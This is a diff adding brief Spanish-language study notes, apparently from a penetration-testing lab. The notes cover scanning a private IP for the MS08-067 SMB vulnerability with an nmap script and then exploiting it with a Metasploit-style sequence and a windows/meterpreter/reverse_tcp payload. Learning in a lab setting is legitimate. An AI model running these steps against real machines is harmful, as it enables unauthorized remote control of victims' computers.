@@ -1,0 +1,31 @@
+cd /usr/share/nmap
+ls
+(cambio de color: script)
+cd scripts/
+ls
+(list todos los csripts para verificar si son vulnerabilidades)
+(selecciono la vulnerabilidad para comprobarla)
+===========================================
+nmap -sV --script smb-vuln-ms08-067 192.168.1.42 
+==============================================
+-sV: versiones de los probragams que corren por los puertos
+--script: aviso de script
+nombre del archivo 
+
+
+ESTABLECER RHOST
+EXPLOIT
+ESTABLECER LHOST (YO)
+EXPLOIT
+
+xp
+===
+escritorio está en documentos and settings /usuarios/desktop
+
+1.46
+
+payload : windows/meterpreter/reverse_tcp
+
+===========================
+(para ubicar un archivo)
+find / -name "....."
